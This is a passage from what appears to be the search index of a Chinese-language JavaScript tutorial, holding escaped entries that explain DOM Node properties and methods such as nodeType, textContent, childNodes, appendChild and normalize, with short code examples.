\u524d\u9762\u3002 Node.prototype.isEqualNode()\uff0cNode.prototype.isSameNode() \u00b6 isEqualNode \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u7528\u4e8e\u68c0\u67e5\u4e24\u4e2a\u8282\u70b9\u662f\u5426\u76f8\u7b49\u3002\u6240\u8c13\u76f8\u7b49\u7684\u8282\u70b9\uff0c\u6307\u7684\u662f\u4e24\u4e2a\u8282\u70b9\u7684\u7c7b\u578b\u76f8\u540c\u3001\u5c5e\u6027\u76f8\u540c\u3001\u5b50\u8282\u70b9\u76f8\u540c\u3002 1 2 3 4 var p1 = document . createElement ( 'p' ); var p2 = document . createElement ( 'p' ); p1 . isEqualNode ( p2 ) // true isSameNode \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u4e24\u4e2a\u8282\u70b9\u662f\u5426\u4e3a\u540c\u4e00\u4e2a\u8282\u70b9\u3002 1 2 3 4 5 var p1 = document . createElement ( 'p' ); var p2 = document . createElement ( 'p' ); p1 . isSameNode ( p2 ) // false p1 . isSameNode ( p1 ) // true Node.prototype.normalize() \u00b6 normalize \u65b9\u6cd5\u7528\u4e8e\u6e05\u7406\u5f53\u524d\u8282\u70b9\u5185\u90e8\u7684\u6240\u6709\u6587\u672c\u8282\u70b9\uff08text\uff09\u3002\u5b83\u4f1a\u53bb\u9664\u7a7a\u7684\u6587\u672c\u8282\u70b9\uff0c\u5e76\u4e14\u5c06\u6bd7\u90bb\u7684\u6587\u672c\u8282\u70b9\u5408\u5e76\u6210\u4e00\u4e2a\uff0c\u4e5f\u5c31\u662f\u8bf4\u4e0d\u5b58\u5728\u7a7a\u7684\u6587\u672c\u8282\u70b9\uff0c\u4ee5\u53ca\u6bd7\u90bb\u7684\u6587\u672c\u8282\u70b9\u3002 1 2 3 4 5 6 7 8 var wrapper = document . createElement ( 'div' ); wrapper . appendChild ( document . createTextNode ( 'Part 1 ' )); wrapper . appendChild ( document . createTextNode ( 'Part 2 ' )); wrapper . childNodes . length // 2 wrapper . normalize (); wrapper . childNodes . length // 1 \u4e0a\u9762\u4ee3\u7801\u4f7f\u7528 normalize \u65b9\u6cd5\u4e4b\u524d\uff0c wrapper \u8282\u70b9\u6709\u4e24\u4e2a\u6bd7\u90bb\u7684\u6587\u672c\u5b50\u8282\u70b9\u3002\u4f7f\u7528 normalize \u65b9\u6cd5\u4e4b\u540e\uff0c\u4e24\u4e2a\u6587\u672c\u5b50\u8282\u70b9\u88ab\u5408\u5e76\u6210\u4e00\u4e2a\u3002 \u8be5\u65b9\u6cd5\u662f Text.splitText \u7684\u9006\u65b9\u6cd5\uff0c\u53ef\u4ee5\u67e5\u770b\u300aText \u8282\u70b9\u5bf9\u8c61\u300b\u4e00\u7ae0\uff0c\u4e86\u89e3\u66f4\u591a\u5185\u5bb9\u3002 Node.prototype.getRootNode() \u00b6 getRootNode() \u65b9\u6cd5\u8fd4\u56de\u5f53\u524d\u8282\u70b9\u6240\u5728\u6587\u6863\u7684\u6839\u8282\u70b9 document \uff0c\u4e0e ownerDocument \u5c5e\u6027\u7684\u4f5c\u7528\u76f8\u540c\u3002 1 2 3 4 document . body . firstChild . getRootNode () === document // true document . body . firstChild . getRootNode () === document . body . firstChild . ownerDocument // true \u8be5\u65b9\u6cd5\u53ef\u7528\u4e8e document \u8282\u70b9\u81ea\u8eab\uff0c\u8fd9\u4e00\u70b9\u4e0e document.ownerDocument \u4e0d\u540c\u3002 1 2 document . getRootNode () // document document . ownerDocument // null","title":"Node \u63a5\u53e3"},{"location":"dom/node/#node","text":"\u6240\u6709 DOM \u8282\u70b9\u5bf9\u8c61\u90fd\u7ee7\u627f\u4e86 Node \u63a5\u53e3\uff0c\u62e5\u6709\u4e00\u4e9b\u5171\u540c\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002\u8fd9\u662f DOM \u64cd\u4f5c\u7684\u57fa\u7840\u3002","title":"Node \u63a5\u53e3"},{"location":"dom/node/#_1","text":"","title":"\u5c5e\u6027"},{"location":"dom/node/#nodeprototypenodetype","text":"nodeType \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\u503c\uff0c\u8868\u793a\u8282\u70b9\u7684\u7c7b\u578b\u3002 1 document . nodeType // 9 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6587\u6863\u8282\u70b9\u7684\u7c7b\u578b\u503c\u4e3a9\u3002 Node \u5bf9\u8c61\u5b9a\u4e49\u4e86\u51e0\u4e2a\u5e38\u91cf\uff0c\u5bf9\u5e94\u8fd9\u4e9b\u7c7b\u578b\u503c\u3002 1 document . nodeType === Node . DOCUMENT_NODE // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6587\u6863\u8282\u70b9\u7684 nodeType \u5c5e\u6027\u7b49\u4e8e\u5e38\u91cf Node.DOCUMENT_NODE \u3002 \u4e0d\u540c\u8282\u70b9\u7684 nodeType \u5c5e\u6027\u503c\u548c\u5bf9\u5e94\u7684\u5e38\u91cf\u5982\u4e0b\u3002 \u6587\u6863\u8282\u70b9\uff08document\uff09\uff1a9\uff0c\u5bf9\u5e94\u5e38\u91cf Node.DOCUMENT_NODE \u5143\u7d20\u8282\u70b9\uff08element\uff09\uff1a1\uff0c\u5bf9\u5e94\u5e38\u91cf Node.ELEMENT_NODE \u5c5e\u6027\u8282\u70b9\uff08attr\uff09\uff1a2\uff0c\u5bf9\u5e94\u5e38\u91cf Node.ATTRIBUTE_NODE \u6587\u672c\u8282\u70b9\uff08text\uff09\uff1a3\uff0c\u5bf9\u5e94\u5e38\u91cf Node.TEXT_NODE \u6587\u6863\u7247\u65ad\u8282\u70b9\uff08DocumentFragment\uff09\uff1a11\uff0c\u5bf9\u5e94\u5e38\u91cf Node.DOCUMENT_FRAGMENT_NODE \u6587\u6863\u7c7b\u578b\u8282\u70b9\uff08DocumentType\uff09\uff1a10\uff0c\u5bf9\u5e94\u5e38\u91cf Node.DOCUMENT_TYPE_NODE \u6ce8\u91ca\u8282\u70b9\uff08Comment\uff09\uff1a8\uff0c\u5bf9\u5e94\u5e38\u91cf Node.COMMENT_NODE \u786e\u5b9a\u8282\u70b9\u7c7b\u578b\u65f6\uff0c\u4f7f\u7528 nodeType \u5c5e\u6027\u662f\u5e38\u7528\u65b9\u6cd5\u3002 1 2 3 4 var node = document . documentElement . firstChild ; if ( node . nodeType === Node . ELEMENT_NODE ) { console . log ( '\u8be5\u8282\u70b9\u662f\u5143\u7d20\u8282\u70b9' ); }","title":"Node.prototype.nodeType"},{"location":"dom/node/#nodeprototypenodename","text":"nodeName \u5c5e\u6027\u8fd4\u56de\u8282\u70b9\u7684\u540d\u79f0\u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <div id=\"d1\">hello world</div> var div = document . getElementById ( 'd1' ); div . nodeName // \"DIV\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5143\u7d20\u8282\u70b9 <div> \u7684 nodeName \u5c5e\u6027\u5c31\u662f\u5927\u5199\u7684\u6807\u7b7e\u540d DIV \u3002 \u4e0d\u540c\u8282\u70b9\u7684 nodeName \u5c5e\u6027\u503c\u5982\u4e0b\u3002 \u6587\u6863\u8282\u70b9\uff08document\uff09\uff1a #document \u5143\u7d20\u8282\u70b9\uff08element\uff09\uff1a\u5927\u5199\u7684\u6807\u7b7e\u540d \u5c5e\u6027\u8282\u70b9\uff08attr\uff09\uff1a\u5c5e\u6027\u7684\u540d\u79f0 \u6587\u672c\u8282\u70b9\uff08text\uff09\uff1a #text \u6587\u6863\u7247\u65ad\u8282\u70b9\uff08DocumentFragment\uff09\uff1a #document-fragment \u6587\u6863\u7c7b\u578b\u8282\u70b9\uff08DocumentType\uff09\uff1a\u6587\u6863\u7684\u7c7b\u578b \u6ce8\u91ca\u8282\u70b9\uff08Comment\uff09\uff1a #comment","title":"Node.prototype.nodeName"},{"location":"dom/node/#nodeprototypenodevalue","text":"nodeValue \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5f53\u524d\u8282\u70b9\u672c\u8eab\u7684\u6587\u672c\u503c\uff0c\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 \u53ea\u6709\u6587\u672c\u8282\u70b9\uff08text\uff09\u3001\u6ce8\u91ca\u8282\u70b9\uff08comment\uff09\u548c\u5c5e\u6027\u8282\u70b9\uff08attr\uff09\u6709\u6587\u672c\u503c\uff0c\u56e0\u6b64\u8fd9\u4e09\u7c7b\u8282\u70b9\u7684 nodeValue \u53ef\u4ee5\u8fd4\u56de\u7ed3\u679c\uff0c\u5176\u4ed6\u7c7b\u578b\u7684\u8282\u70b9\u4e00\u5f8b\u8fd4\u56de null \u3002\u540c\u6837\u7684\uff0c\u4e5f\u53ea\u6709\u8fd9\u4e09\u7c7b\u8282\u70b9\u53ef\u4ee5\u8bbe\u7f6e nodeValue \u5c5e\u6027\u7684\u503c\uff0c\u5176\u4ed6\u7c7b\u578b\u7684\u8282\u70b9\u8bbe\u7f6e\u65e0\u6548\u3002 1 2 3 4 5 // HTML \u4ee3\u7801\u5982\u4e0b // <div id=\"d1\">hello world</div> var div = document . getElementById ( 'd1' ); div . nodeValue // null div . firstChild . nodeValue // \"hello world\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c div \u662f\u5143\u7d20\u8282\u70b9\uff0c nodeValue \u5c5e\u6027\u8fd4\u56de null \u3002 div.firstChild \u662f\u6587\u672c\u8282\u70b9\uff0c\u6240\u4ee5\u53ef\u4ee5\u8fd4\u56de\u6587\u672c\u503c\u3002","title":"Node.prototype.nodeValue"},{"location":"dom/node/#nodeprototypetextcontent","text":"textContent \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u8282\u70b9\u548c\u5b83\u7684\u6240\u6709\u540e\u4ee3\u8282\u70b9\u7684\u6587\u672c\u5185\u5bb9\u3002 1 2 3 4 5 // HTML \u4ee3\u7801\u4e3a // <div id=\"divA\">This is <span>some</span> text</div> document . getElementById ( 'divA' ). textContent // This is some text textContent \u5c5e\u6027\u81ea\u52a8\u5ffd\u7565\u5f53\u524d\u8282\u70b9\u5185\u90e8\u7684 HTML \u6807\u7b7e\uff0c\u8fd4\u56de\u6240\u6709\u6587\u672c\u5185\u5bb9\u3002 \u8be5\u5c5e\u6027\u662f\u53ef\u8bfb\u5199\u7684\uff0c\u8bbe\u7f6e\u8be5\u5c5e\u6027\u7684\u503c\uff0c\u4f1a\u7528\u4e00\u4e2a\u65b0\u7684\u6587\u672c\u8282\u70b9\uff0c\u66ff\u6362\u6240\u6709\u539f\u6765\u7684\u5b50\u8282\u70b9\u3002\u5b83\u8fd8\u6709\u4e00\u4e2a\u597d\u5904\uff0c\u5c31\u662f\u81ea\u52a8\u5bf9 HTML \u6807\u7b7e\u8f6c\u4e49\u3002\u8fd9\u5f88\u9002\u5408\u7528\u4e8e\u7528\u6237\u63d0\u4f9b\u7684\u5185\u5bb9\u3002 1 document . getElementById ( 'foo' ). textContent = '<p>GoodBye!</p>' ; \u4e0a\u9762\u4ee3\u7801\u5728\u63d2\u5165\u6587\u672c\u65f6\uff0c\u4f1a\u5c06 <p> \u6807\u7b7e\u89e3\u91ca\u4e3a\u6587\u672c\uff0c\u800c\u4e0d\u4f1a\u5f53\u4f5c\u6807\u7b7e\u5904\u7406\u3002 \u5bf9\u4e8e\u6587\u672c\u8282\u70b9\uff08text\uff09\u3001\u6ce8\u91ca\u8282\u70b9\uff08comment\uff09\u548c\u5c5e\u6027\u8282\u70b9\uff08attr\uff09\uff0c textContent \u5c5e\u6027\u7684\u503c\u4e0e nodeValue \u5c5e\u6027\u76f8\u540c\u3002\u5bf9\u4e8e\u5176\u4ed6\u7c7b\u578b\u7684\u8282\u70b9\uff0c\u8be5\u5c5e\u6027\u4f1a\u5c06\u6bcf\u4e2a\u5b50\u8282\u70b9\uff08\u4e0d\u5305\u62ec\u6ce8\u91ca\u8282\u70b9\uff09\u7684\u5185\u5bb9\u8fde\u63a5\u5728\u4e00\u8d77\u8fd4\u56de\u3002\u5982\u679c\u4e00\u4e2a\u8282\u70b9\u6ca1\u6709\u5b50\u8282\u70b9\uff0c\u5219\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\u3002 \u6587\u6863\u8282\u70b9\uff08document\uff09\u548c\u6587\u6863\u7c7b\u578b\u8282\u70b9\uff08doctype\uff09\u7684 textContent \u5c5e\u6027\u4e3a null \u3002\u5982\u679c\u8981\u8bfb\u53d6\u6574\u4e2a\u6587\u6863\u7684\u5185\u5bb9\uff0c\u53ef\u4ee5\u4f7f\u7528 document.documentElement.textContent \u3002","title":"Node.prototype.textContent"},{"location":"dom/node/#nodeprototypebaseuri","text":"baseURI \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5f53\u524d\u7f51\u9875\u7684\u7edd\u5bf9\u8def\u5f84\u3002\u6d4f\u89c8\u5668\u6839\u636e\u8fd9\u4e2a\u5c5e\u6027\uff0c\u8ba1\u7b97\u7f51\u9875\u4e0a\u7684\u76f8\u5bf9\u8def\u5f84\u7684 URL\u3002\u8be5\u5c5e\u6027\u4e3a\u53ea\u8bfb\u3002 1 2 3 4 // \u5f53\u524d\u7f51\u9875\u7684\u7f51\u5740\u4e3a // http://www.example.com/index.html document . baseURI // \"http://www.example.com/index.html\" \u5982\u679c\u65e0\u6cd5\u8bfb\u5230\u7f51\u9875\u7684 URL\uff0c baseURI \u5c5e\u6027\u8fd4\u56de null \u3002 \u8be5\u5c5e\u6027\u7684\u503c\u4e00\u822c\u7531\u5f53\u524d\u7f51\u5740\u7684 URL\uff08\u5373 window.location \u5c5e\u6027\uff09\u51b3\u5b9a\uff0c\u4f46\u662f\u53ef\u4ee5\u4f7f\u7528 HTML \u7684 <base> \u6807\u7b7e\uff0c\u6539\u53d8\u8be5\u5c5e\u6027\u7684\u503c\u3002 1 < base href = \"http://www.example.com/page.html\" > \u8bbe\u7f6e\u4e86\u4ee5\u540e\uff0c baseURI \u5c5e\u6027\u5c31\u8fd4\u56de <base> \u6807\u7b7e\u8bbe\u7f6e\u7684\u503c\u3002","title":"Node.prototype.baseURI"},{"location":"dom/node/#nodeprototypeownerdocument","text":"Node.ownerDocument \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u8282\u70b9\u6240\u5728\u7684\u9876\u5c42\u6587\u6863\u5bf9\u8c61\uff0c\u5373 document \u5bf9\u8c61\u3002 1 2 var d = p . ownerDocument ; d === document // true document \u5bf9\u8c61\u672c\u8eab\u7684 ownerDocument \u5c5e\u6027\uff0c\u8fd4\u56de null \u3002","title":"Node.prototype.ownerDocument"},{"location":"dom/node/#nodeprototypenextsibling","text":"Node.nextSibling \u5c5e\u6027\u8fd4\u56de\u7d27\u8ddf\u5728\u5f53\u524d\u8282\u70b9\u540e\u9762\u7684\u7b2c\u4e00\u4e2a\u540c\u7ea7\u8282\u70b9\u3002\u5982\u679c\u5f53\u524d\u8282\u70b9\u540e\u9762\u6ca1\u6709\u540c\u7ea7\u8282\u70b9\uff0c\u5219\u8fd4\u56de null \u3002 1 2 3 4 5 6 // HTML \u4ee3\u7801\u5982\u4e0b // <div id=\"d1\">hello</div><div id=\"d2\">world</div> var d1 = document . getElementById ( 'd1' ); var d2 = document . getElementById ( 'd2' ); d1 . nextSibling === d2 // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c d1.nextSibling \u5c31\u662f\u7d27\u8ddf\u5728 d1 \u540e\u9762\u7684\u540c\u7ea7\u8282\u70b9 d2 \u3002 \u6ce8\u610f\uff0c\u8be5\u5c5e\u6027\u8fd8\u5305\u62ec\u6587\u672c\u8282\u70b9\u548c\u6ce8\u91ca\u8282\u70b9\uff08 <!-- comment --> \uff09\u3002\u56e0\u6b64\u5982\u679c\u5f53\u524d\u8282\u70b9\u540e\u9762\u6709\u7a7a\u683c\uff0c\u8be5\u5c5e\u6027\u4f1a\u8fd4\u56de\u4e00\u4e2a\u6587\u672c\u8282\u70b9\uff0c\u5185\u5bb9\u4e3a\u7a7a\u683c\u3002 nextSibling \u5c5e\u6027\u53ef\u4ee5\u7528\u6765\u904d\u5386\u6240\u6709\u5b50\u8282\u70b9\u3002 1 2 3 4 5 6 var el = document . getElementById ( 'div1' ). firstChild ; while ( el !== null ) { console . log ( el . nodeName ); el = el . nextSibling ; } \u4e0a\u9762\u4ee3\u7801\u904d\u5386 div1 \u8282\u70b9\u7684\u6240\u6709\u5b50\u8282\u70b9\u3002","title":"Node.prototype.nextSibling"},{"location":"dom/node/#nodeprototypeprevioussibling","text":"previousSibling \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u8282\u70b9\u524d\u9762\u7684\u3001\u8ddd\u79bb\u6700\u8fd1\u7684\u4e00\u4e2a\u540c\u7ea7\u8282\u70b9\u3002\u5982\u679c\u5f53\u524d\u8282\u70b9\u524d\u9762\u6ca1\u6709\u540c\u7ea7\u8282\u70b9\uff0c\u5219\u8fd4\u56de null \u3002 1 2 3 4 5 6 // HTML \u4ee3\u7801\u5982\u4e0b // <div id=\"d1\">hello</div><div id=\"d2\">world</div> var d1 = document . getElementById ( 'd1' ); var d2 = document . getElementById ( 'd2' ); d2 . previousSibling === d1 // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c d2.previousSibling \u5c31\u662f d2 \u524d\u9762\u7684\u540c\u7ea7\u8282\u70b9 d1 \u3002 \u6ce8\u610f\uff0c\u8be5\u5c5e\u6027\u8fd8\u5305\u62ec\u6587\u672c\u8282\u70b9\u548c\u6ce8\u91ca\u8282\u70b9\u3002\u56e0\u6b64\u5982\u679c\u5f53\u524d\u8282\u70b9\u524d\u9762\u6709\u7a7a\u683c\uff0c\u8be5\u5c5e\u6027\u4f1a\u8fd4\u56de\u4e00\u4e2a\u6587\u672c\u8282\u70b9\uff0c\u5185\u5bb9\u4e3a\u7a7a\u683c\u3002","title":"Node.prototype.previousSibling"},{"location":"dom/node/#nodeprototypeparentnode","text":"parentNode \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u8282\u70b9\u7684\u7236\u8282\u70b9\u3002\u5bf9\u4e8e\u4e00\u4e2a\u8282\u70b9\u6765\u8bf4\uff0c\u5b83\u7684\u7236\u8282\u70b9\u53ea\u53ef\u80fd\u662f\u4e09\u79cd\u7c7b\u578b\uff1a\u5143\u7d20\u8282\u70b9\uff08element\uff09\u3001\u6587\u6863\u8282\u70b9\uff08document\uff09\u548c\u6587\u6863\u7247\u6bb5\u8282\u70b9\uff08documentfragment\uff09\u3002 1 2 3 if ( node . parentNode ) { node . parentNode . removeChild ( node ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u901a\u8fc7 node.parentNode \u5c5e\u6027\u5c06 node \u8282\u70b9\u4ece\u6587\u6863\u91cc\u9762\u79fb\u9664\u3002 \u6587\u6863\u8282\u70b9\uff08document\uff09\u548c\u6587\u6863\u7247\u6bb5\u8282\u70b9\uff08documentfragment\uff09\u7684\u7236\u8282\u70b9\u90fd\u662f null \u3002\u53e6\u5916\uff0c\u5bf9\u4e8e\u90a3\u4e9b\u751f\u6210\u540e\u8fd8\u6ca1\u63d2\u5165 DOM \u6811\u7684\u8282\u70b9\uff0c\u7236\u8282\u70b9\u4e5f\u662f null \u3002","title":"Node.prototype.parentNode"},{"location":"dom/node/#nodeprototypeparentelement","text":"parentElement \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u8282\u70b9\u7684\u7236\u5143\u7d20\u8282\u70b9\u3002\u5982\u679c\u5f53\u524d\u8282\u70b9\u6ca1\u6709\u7236\u8282\u70b9\uff0c\u6216\u8005\u7236\u8282\u70b9\u7c7b\u578b\u4e0d\u662f\u5143\u7d20\u8282\u70b9\uff0c\u5219\u8fd4\u56de null \u3002 1 2 3 if ( node . parentElement ) { node . parentElement . style . color = 'red' ; } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7236\u5143\u7d20\u8282\u70b9\u7684\u6837\u5f0f\u8bbe\u5b9a\u4e86\u7ea2\u8272\u3002 \u7531\u4e8e\u7236\u8282\u70b9\u53ea\u53ef\u80fd\u662f\u4e09\u79cd\u7c7b\u578b\uff1a\u5143\u7d20\u8282\u70b9\u3001\u6587\u6863\u8282\u70b9\uff08document\uff09\u548c\u6587\u6863\u7247\u6bb5\u8282\u70b9\uff08documentfragment\uff09\u3002 parentElement \u5c5e\u6027\u76f8\u5f53\u4e8e\u628a\u540e\u4e24\u79cd\u7236\u8282\u70b9\u90fd\u6392\u9664\u4e86\u3002","title":"Node.prototype.parentElement"},{"location":"dom/node/#nodeprototypefirstchildnodeprototypelastchild","text":"firstChild \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u8282\u70b9\u7684\u7b2c\u4e00\u4e2a\u5b50\u8282\u70b9\uff0c\u5982\u679c\u5f53\u524d\u8282\u70b9\u6ca1\u6709\u5b50\u8282\u70b9\uff0c\u5219\u8fd4\u56de null \u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <p id=\"p1\"><span>First span</span></p> var p1 = document . getElementById ( 'p1' ); p1 . firstChild . nodeName // \"SPAN\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c p \u5143\u7d20\u7684\u7b2c\u4e00\u4e2a\u5b50\u8282\u70b9\u662f span \u5143\u7d20\u3002 \u6ce8\u610f\uff0c firstChild \u8fd4\u56de\u7684\u9664\u4e86\u5143\u7d20\u8282\u70b9\uff0c\u8fd8\u53ef\u80fd\u662f\u6587\u672c\u8282\u70b9\u6216\u6ce8\u91ca\u8282\u70b9\u3002 1 2 3 4 5 6 // HTML \u4ee3\u7801\u5982\u4e0b // <p id=\"p1\"> // <span>First span</span> // </p> var p1 = document . getElementById ( 'p1' ); p1 . firstChild . nodeName // \"#text\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c p \u5143\u7d20\u4e0e span \u5143\u7d20\u4e4b\u95f4\u6709\u7a7a\u767d\u5b57\u7b26\uff0c\u8fd9\u5bfc\u81f4 firstChild \u8fd4\u56de\u7684\u662f\u6587\u672c\u8282\u70b9\u3002 lastChild \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u8282\u70b9\u7684\u6700\u540e\u4e00\u4e2a\u5b50\u8282\u70b9\uff0c\u5982\u679c\u5f53\u524d\u8282\u70b9\u6ca1\u6709\u5b50\u8282\u70b9\uff0c\u5219\u8fd4\u56de null \u3002\u7528\u6cd5\u4e0e firstChild \u5c5e\u6027\u76f8\u540c\u3002","title":"Node.prototype.firstChild\uff0cNode.prototype.lastChild"},{"location":"dom/node/#nodeprototypechildnodes","text":"childNodes \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff08 NodeList \u96c6\u5408\uff09\uff0c\u6210\u5458\u5305\u62ec\u5f53\u524d\u8282\u70b9\u7684\u6240\u6709\u5b50\u8282\u70b9\u3002 1 var children = document . querySelector ( 'ul' ). childNodes ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c children \u5c31\u662f ul \u5143\u7d20\u7684\u6240\u6709\u5b50\u8282\u70b9\u3002 \u4f7f\u7528\u8be5\u5c5e\u6027\uff0c\u53ef\u4ee5\u904d\u5386\u67d0\u4e2a\u8282\u70b9\u7684\u6240\u6709\u5b50\u8282\u70b9\u3002 1 2 3 4 5 6 var div = document . getElementById ( 'div1' ); var children = div . childNodes ; for ( var i = 0 ; i < children . length ; i ++ ) { // ... } \u6587\u6863\u8282\u70b9\uff08document\uff09\u5c31\u6709\u4e24\u4e2a\u5b50\u8282\u70b9\uff1a\u6587\u6863\u7c7b\u578b\u8282\u70b9\uff08docType\uff09\u548c HTML \u6839\u5143\u7d20\u8282\u70b9\u3002 1 2 3 4 5 6 var children = document . childNodes ; for ( var i = 0 ; i < children . length ; i ++ ) { console . log ( children [ i ]. nodeType ); } // 10 // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6587\u6863\u8282\u70b9\u7684\u7b2c\u4e00\u4e2a\u5b50\u8282\u70b9\u7684\u7c7b\u578b\u662f10\uff08\u5373\u6587\u6863\u7c7b\u578b\u8282\u70b9\uff09\uff0c\u7b2c\u4e8c\u4e2a\u5b50\u8282\u70b9\u7684\u7c7b\u578b\u662f1\uff08\u5373\u5143\u7d20\u8282\u70b9\uff09\u3002 \u6ce8\u610f\uff0c\u9664\u4e86\u5143\u7d20\u8282\u70b9\uff0c childNodes \u5c5e\u6027\u7684\u8fd4\u56de\u503c\u8fd8\u5305\u62ec\u6587\u672c\u8282\u70b9\u548c\u6ce8\u91ca\u8282\u70b9\u3002\u5982\u679c\u5f53\u524d\u8282\u70b9\u4e0d\u5305\u62ec\u4efb\u4f55\u5b50\u8282\u70b9\uff0c\u5219\u8fd4\u56de\u4e00\u4e2a\u7a7a\u7684 NodeList \u96c6\u5408\u3002\u7531\u4e8e NodeList \u5bf9\u8c61\u662f\u4e00\u4e2a\u52a8\u6001\u96c6\u5408\uff0c\u4e00\u65e6\u5b50\u8282\u70b9\u53d1\u751f\u53d8\u5316\uff0c\u7acb\u523b\u4f1a\u53cd\u6620\u5728\u8fd4\u56de\u7ed3\u679c\u4e4b\u4e2d\u3002","title":"Node.prototype.childNodes"},{"location":"dom/node/#nodeprototypeisconnected","text":"isConnected \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u8282\u70b9\u662f\u5426\u5728\u6587\u6863\u4e4b\u4e2d\u3002 1 2 3 4 5 var test = document . createElement ( 'p' ); test . isConnected // false document . body . appendChild ( test ); test . isConnected // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c test \u8282\u70b9\u662f\u811a\u672c\u751f\u6210\u7684\u8282\u70b9\uff0c\u6ca1\u6709\u63d2\u5165\u6587\u6863\u4e4b\u524d\uff0c isConnected \u5c5e\u6027\u8fd4\u56de false \uff0c\u63d2\u5165\u4e4b\u540e\u8fd4\u56de true \u3002","title":"Node.prototype.isConnected"},{"location":"dom/node/#_2","text":"","title":"\u65b9\u6cd5"},{"location":"dom/node/#nodeprototypeappendchild","text":"appendChild() \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u8282\u70b9\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\uff0c\u5c06\u5176\u4f5c\u4e3a\u6700\u540e\u4e00\u4e2a\u5b50\u8282\u70b9\uff0c\u63d2\u5165\u5f53\u524d\u8282\u70b9\u3002\u8be5\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u5c31\u662f\u63d2\u5165\u6587\u6863\u7684\u5b50\u8282\u70b9\u3002 1 2 var p = document . createElement ( 'p' ); document . body . appendChild ( p ); \u4e0a\u9762\u4ee3\u7801\u65b0\u5efa\u4e00\u4e2a <p> \u8282\u70b9\uff0c\u5c06\u5176\u63d2\u5165 document.body \u7684\u5c3e\u90e8\u3002 \u5982\u679c\u53c2\u6570\u8282\u70b9\u662f DOM \u5df2\u7ecf\u5b58\u5728\u7684\u8282\u70b9\uff0c appendChild() \u65b9\u6cd5\u4f1a\u5c06\u5176\u4ece\u539f\u6765\u7684\u4f4d\u7f6e\uff0c\u79fb\u52a8\u5230\u65b0\u4f4d\u7f6e\u3002 1 2 var div = document . getElementById ( 'myDiv' ); document . body . appendChild ( div ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u63d2\u5165\u7684\u662f\u4e00\u4e2a\u5df2\u7ecf\u5b58\u5728\u7684\u8282\u70b9 myDiv \uff0c\u7ed3\u679c\u5c31\u662f\u8be5\u8282\u70b9\u4f1a\u4ece\u539f\u6765\u7684\u4f4d\u7f6e\uff0c\u79fb\u52a8\u5230 document.body \u7684\u5c3e\u90e8\u3002 \u5982\u679c appendChild() \u65b9\u6cd5\u7684\u53c2\u6570\u662f DocumentFragment \u8282\u70b9\uff0c\u90a3\u4e48\u63d2\u5165\u7684\u662f DocumentFragment \u7684\u6240\u6709\u5b50\u8282\u70b9\uff0c\u800c\u4e0d\u662f DocumentFragment \u8282\u70b9\u672c\u8eab\u3002\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u7a7a\u7684 DocumentFragment \u8282\u70b9\u3002","title":"Node.prototype.appendChild()"},{"location":"dom/node/#nodeprototypehaschildnodes","text":"hasChildNodes \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u8282\u70b9\u662f\u5426\u6709\u5b50\u8282\u70b9\u3002 1 2 3 4 5 var foo = document . getElementById ( 'foo' ); if ( foo . hasChildNodes ()) { foo . removeChild ( foo . childNodes [ 0 ]); } \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u5982\u679c foo \u8282\u70b9\u6709\u5b50\u8282\u70b9\uff0c\u5c31\u79fb\u9664\u7b2c\u4e00\u4e2a\u5b50\u8282\u70b9\u3002 \u6ce8\u610f\uff0c\u5b50\u8282\u70b9\u5305\u62ec\u6240\u6709\u7c7b\u578b\u7684\u8282\u70b9\uff0c\u5e76\u4e0d\u4ec5\u4ec5\u662f\u5143\u7d20\u8282\u70b9\u3002\u54ea\u6015\u8282\u70b9\u53ea\u5305\u542b\u4e00\u4e2a\u7a7a\u683c\uff0c hasChildNodes \u65b9\u6cd5\u4e5f\u4f1a\u8fd4\u56de true \u3002 